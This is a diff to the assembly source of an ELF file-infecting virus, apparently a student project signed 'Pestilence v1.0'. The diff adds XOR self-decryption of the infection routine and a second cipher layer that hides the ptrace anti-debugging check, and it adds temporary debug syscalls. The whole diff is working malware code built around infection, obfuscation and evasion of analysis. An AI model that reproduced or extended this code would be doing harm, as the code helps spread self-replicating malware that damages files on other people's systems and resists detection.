@@ -79,12 +79,24 @@ begin:
 ; int can_run_infection();
 ; rax can_run_infection();
 can_run_infection:
+;TMP DEBUG
+	push rax
+	mov rax, 0
+	mov rdi, 0
+	mov rsi, rsp
+	mov rdx, 1
+	syscall
+	pop rax
+; .TMP_uncipher block will disappear at compilation, and replaced by a maxgic_key,
+; result of xor between the two following blocks
+.TMP_START_OF_TWO:
 .TMP_anti_debugging:
 	mov rax, SYS_PTRACE				; _ret = ptrace(
 	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
 	xor rsi, rsi					; 	0,
 	xor rdx, rdx					; 	0
-	syscall						; );
+;	syscall						; );
+	mov rax, 0 ; TMP DEBUG
 	cmp rax, 0					; if (_ret < 0)
 	jl .debugged					; 	goto .debugged;
 
@@ -94,21 +106,42 @@ can_run_infection:
 .TMP_END_anti_debugging:
 
 .TMP_uncipher:
-	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
-	cmp rax, 0x0					; ...
-	je .valid					; 	goto .valid;
 	lea rdi, [rel begin]				; data = begin addr
 	add rdi, infection_routine - begin		; data += infection_routine - begin
 	mov rsi, _end - infection_routine		; size = _end - infection_routine
 	lea rdx, [rel key]				; key = key
-	call xor_cipher					; xor_cipher(data, size, key)
+	mov rcx, key_size				; key_size = key_size
+	call xor_cipher					; xor_cipher(data, size, key, key_size)
+	jmp .valid					; goto .valid
 .TMP_END_uncipher:
+.TMP_END_OF_TWO:
+
+	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
+	cmp rax, 0x0					; ...
+	je .valid					; 	goto .valid;
+	lea rdi, [rel .TMP_START_OF_TWO]		; _data = &.TMP_anti_debugging;
+	mov rsi, .TMP_END_OF_TWO - .TMP_START_OF_TWO	;_size = .TMP_END_anti_debugging - .TMP_anti_debugging;
+	lea rdx, [rel magic_key]			; _key = &magic_key;
+	mov rcx, magic_key_size				; _key_size = magic_key_size;
+	call xor_cipher					; xor_cipher(_data, _size, _key, _key_size);
+
+;TMP DEBUG
+	push rax
+	mov rax, 0
+	mov rdi, 0
+	mov rsi, rsp
+	mov rdx, 1
+	syscall
+	pop rax
+
+	jmp .TMP_START_OF_TWO				; goto .TMP_anti_debugging
 
 	.valid:
 		mov rax, 1					; return 1;
 		ret
 
 	.debugged:
+		jmp .TMP_END_OF_TWO ; TMP_TODO_DEBUG
 		lea rdi, [rel debugged_message]		; print_string(debugged_message);
 		call print_string			; ...
 		xor rax, rax				; return 0;
@@ -302,9 +335,10 @@ print_string:
 
 	ret
 
-; void xor_cipher(char *data, int size, char *key);
-; xor_cipher(rdi data, rsi size, rdx key);
+; void xor_cipher(char *data, int size, char *key, int key_size);
+; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
 xor_cipher:
+	push rcx					; save key_size
 	push rdx					; save key
 
 	.loop:
@@ -319,18 +353,21 @@ xor_cipher:
 		inc rdi					; data++
 		inc rdx					; key++
 		dec rsi					; size--
+		dec rcx					; key_size--
 
-		cmp byte [rdx], 0			; if (*key == 0)
+		cmp rcx, 0				; if (key_size == 0)
 		je .key_reset				; 	goto .key_reset
 
 		jmp .loop				; goto .loop
 
 	.key_reset:
 		mov rdx, [rsp]				; restore key
+		mov rcx, [rsp + 8]			; ...
 		jmp .loop				; goto .loop
 
 	.end:
 		pop rdx					; reset stack
+		pop rcx					; ...
 		ret					; return
 
 ; void decompression(long *compressed_data_size_ptr, uint8_t *compressed_data_ptr);
@@ -440,9 +477,12 @@ infected_folder_2: db "/tmp/test2/", 0
 elf_64_magic: db 0x7F, "ELF", 2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0
 len_elf_64_magic: equ $ - elf_64_magic
 compressed_data_size2: dq 0x00				; Filled in infected
-key: db "S3cr3tK3y", 0
+key: db "S3cr3tK3y"
+key_size: equ $ - key
 debugged_message: db "DEBUG DETECTED ;)", 0
 process_message: db "Process detected ;)", 0
+magic_key: db 0x00					; Will be replaced by a script
+magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
 signature: db "Pestilence v1.0 by jmaia and dhubleur", 0
 ; END FAKE .data SECTION
@@ -796,7 +836,8 @@ treat_file:
 	add rdi, infection_routine - begin		;
 	mov rsi, _end - infection_routine		; size = _end - infection_routine
 	lea rdx, [rel key]				; key = key
-	call xor_cipher					; xor_cipher(data, size, key)
+	mov rcx, key_size				; key_size = key_size
+	call xor_cipher					; xor_cipher(data, size, key, key_size)
 
 
 .unmap_file:
